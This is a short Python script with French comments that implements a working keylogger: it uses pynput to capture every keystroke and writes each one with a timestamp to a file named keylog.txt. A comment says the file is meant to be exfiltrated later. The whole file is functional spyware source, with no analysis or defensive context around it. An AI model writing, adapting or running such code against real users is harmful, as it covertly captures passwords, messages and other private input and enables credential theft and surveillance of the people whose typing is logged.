# lire les frappes au fur et à mesure que l'utilisateur tape des choses
from pynput.keyboard import Key, Listener
# enregistrera les frappes de touches dans un fichier que nous pourrons ensuite exfiltrer par des moyens appropriés
import logging

# paramètre le fichier log :
    # %(asctime)s pour la date et l'heure
    # %(message)s pour le contenu
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    # enregistre dans le fichier log après l'avoir convertie en string
    logging.info(str(key))

# chaque fois qu'une touche est enfoncée Listener est déclenché et appelle notre fonction qui enregistre ensuite nos frappes dans le fichier log
with Listener(on_press=on_press) as listener :
    listener.join()